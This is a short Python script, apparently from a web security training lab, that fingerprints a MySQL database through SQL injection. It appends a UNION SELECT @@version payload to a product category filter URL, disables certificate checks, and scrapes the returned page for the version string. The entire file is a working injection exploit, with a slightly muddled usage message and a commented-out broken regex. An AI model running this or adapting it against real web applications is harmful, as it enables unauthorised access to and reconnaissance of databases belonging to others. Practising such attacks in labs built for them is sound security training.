import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_version(url):
	path = 'filter?category=Pets'
	payload = "' UNION SELECT @@version, NULL#"
	r = requests.get(url + path + payload, verify=False)
	response = r.text
	if 'ubuntu' in response:
		print('Database Found, printing out the version ...')
		soup = BeautifulSoup(response, 'html.parser')
		version = soup.find(text=re.compile('.*ubuntu.*'))
		# version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\{1,2}.*')) using regex to find the digits doesnt work though getting an error
		print(f'Database version displayed is {version}')
		return True
	return False

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f"[-] Usage: {sys.argv[0]} <url>")
		print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
		sys.exit(-1)

	if not exploit_sqli_version(url):
		print("did not find db version")